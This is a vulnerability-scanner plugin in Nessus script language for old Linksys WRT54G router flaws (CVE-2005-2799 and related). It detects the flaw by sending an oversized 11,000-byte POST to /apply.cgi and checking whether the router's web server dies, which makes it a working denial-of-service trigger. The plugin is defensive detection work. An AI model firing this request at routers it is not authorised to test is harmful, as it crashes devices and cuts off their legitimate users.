#
#  Josh Zlatin-Amishav <josh at ramat.cc>
#  GPLv2
#
# Changes by Tenable:
# - Fixed a typo in the description, added include (4/2/2013)
# - Revised plugin title, changed family (1/21/2009)


include("compat.inc");

if (description)
{
 script_id(20096);
 script_version("$Revision: 1.13 $");
 script_cvs_date("$Date: 2013/04/02 13:18:03 $");

 script_cve_id(
   "CVE-2005-2799", 
   "CVE-2005-2912", 
   "CVE-2005-2914", 
   "CVE-2005-2915", 
   "CVE-2005-2916"
 );
 script_bugtraq_id(14822);
 script_osvdb_id(
   19386, 
   19387, 
   19388, 
   19389, 
   19390
 );
 
 script_name(english:"Linksys Multiple Vulnerabilities (OF, DoS, more)");
 script_summary(english:"Checks for DOS in apply.cgi");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote router is affected by multiple flaws.");
 script_set_attribute(attribute:"description", value:
"The remote host appears to be a Linksys WRT54G Wireless Router. 

The firmware version installed on the remote host is prone to several
flaws:

  - Execute arbitrary commands on the affected router with 
    root privilages. (CVE-2005-2916)

  - Download and replace the configuration of affected 
    routers via a special POST request to the 'restore.cgi' 
    or 'upgrade.cgi' scripts. (CVE-2005-2799)

  - Allow remote attackers to obtain encrypted configuration 
    information and, if the key is known, modify the 
    configuration. (CVE-2005-2914, CVE-2005-2915)

  - Degrade the performance of affected devices and cause 
    the web server to become unresponsive, potentially 
    denying service to legitimate users. (CVE-2005-2912)"
 );
  # http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=304
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?634ea312");
  # http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=305
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?551a93ee");
  # http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=306
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?50729602");
  # http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=307
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?469a3365");
  # http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=308
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?50f0e7ad");
 script_set_attribute(attribute:"solution", value:
"Upgrade to firmware version 4.20.7 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'Linksys WRT54 Access Point apply.cgi Buffer Overflow');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
 script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'CANVAS');

 script_set_attribute(attribute:"plugin_publication_date", value:"2005/10/28");
 script_set_attribute(attribute:"vuln_publication_date", value:"2005/09/13");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe",value:"cpe:/h:cisco:linksys_wrt54gc_router"); 
 script_end_attributes();
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"Copyright (C) 2005-2013 Josh Zlatin-Amishav");
 script_family(english:"CISCO");

 script_dependencie("http_version.nasl");
 script_require_ports("Services/www",80);
 exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (! get_port_state(port)) exit(0);
if ( http_is_dead(port:port) ) exit(0);

banner = get_http_banner(port:port);
if (banner && 'realm="WRT54G"' >< banner) {
  soc = http_open_socket(port);
  if (! soc) exit(0);

  set_kb_item(name:"Services/www/" + port + "/embedded", value:TRUE);

  len = 11000;	# 10058 should be enough
  req = string("POST ", "/apply.cgi", " HTTP/1.0\r\nContent-Length: ", len,
	"\r\n\r\n", crap(len), "\r\n");
  send(socket:soc, data:req);
  http_close_socket(soc);

  sleep(1);

  if(http_is_dead(port: port))
  {
   security_hole(port);
   exit(0);
  }
} 
